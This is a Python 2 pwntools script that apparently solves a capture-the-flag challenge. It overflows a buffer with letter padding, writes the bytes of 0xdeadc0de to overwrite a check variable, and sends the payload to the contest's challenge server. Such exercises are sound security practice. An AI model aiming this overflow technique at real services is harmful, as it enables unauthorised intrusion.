#!/usr/bin/env python

#Run in python 2!
from pwn import *
important=0xdeadc0de
payload = ''
def identifier(l=26):
    output = ""
    for i in range(65,65+l):
        output+=chr(i)*4
    return output

#Payload that crashes the program
#payload = identifier()*2

padding = identifier()+identifier(10-4)
payload=padding
payload+="\xde\xc0\xad\xde"
#payload += chr(0xde)+chr(0xc0)+chr(0xad)+chr(0xde)
#payload+=chr(0xff)*4
#chr(0xde)*4+"AAAA"#+chr(0xad)+chr(0xc0)+chr(0xde)
#+"\x41\x41\x41\x41"+"\xde\xc0\xad\xde"#p32(important)#'AAAA'
print(payload)
with open("payload.in","w") as f:
    f.write(payload)

# Solve
conn = remote('challenges.csdc20t.ctf.sg',10013)
# Main menu
print(conn.recvuntil("=>"))
conn.send(payload+"\n")
conn.interactive()
